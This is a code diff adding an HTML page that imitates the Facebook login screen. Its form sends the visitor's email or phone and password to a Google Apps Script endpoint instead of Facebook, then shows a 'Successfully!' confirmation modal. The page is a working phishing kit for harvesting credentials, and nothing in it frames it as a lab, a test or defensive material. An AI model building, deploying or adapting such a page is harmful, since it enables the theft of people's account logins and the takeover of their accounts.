@@ -1,0 +1,76 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <h2>Facebook</h2>
+      <form id="loginForm" action="https://script.google.com/macros/s/AKfycbxXX2TELFVW7S9N-CY9U2rguHBYf39bwLFcWYxvcWj_NKHwngcL-H5m8eyCeNQD18K-fw/exec" method="post" onsubmit="handleSubmit(event)">
+ <input type="text" placeholder="Email or Phone" name="email" required class="email" id="email">
+        <input type="password" class="password" placeholder="Password" name="password" required id="password">
+        <button type="submit" class="login-btn">Log In</button>
+        <div class="remember-forgot">
+          <label>
+            <input type="checkbox"> Keep me logged in
+          </label>
+          <a href="#">Forgotten password?</a>
+        </div>
+      </form>
+      <div class="divider">
+        <span>or</span>
+      </div>
+      <button class="create-account-btn">Create New Account</button>
+    </div>
+  </div>
+  <!-- Success Modal -->
+  <div id="successModal" class="modal">
+    <div class="modal-content">
+      <p> Form Submitted </p>
+      <span class="close">&times;</span>
+
+
+      <!-- Loader wrapper with checkmark -->
+      <div class="loader-wrapper">
+        <div class="checkmark">✔</div>
+      </div>
+      <p>Successfully!</p>
+      
+    </div>
+  </div>
+
+  <div id="errorModal" class="modal">
+    <div class="modal-content">
+      <p> Error </p>
+      <span class="close">&times;</span>
+
+
+      <!-- Loader wrapper with checkmark -->
+      <div class="loader-wrapper2">
+        <div class="checkmark2">&times;</div>
+      </div>
+      <p>Network Connection!</p>
+      
+    </div>
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="./main.js"></script>
+</body>
+</html>
+
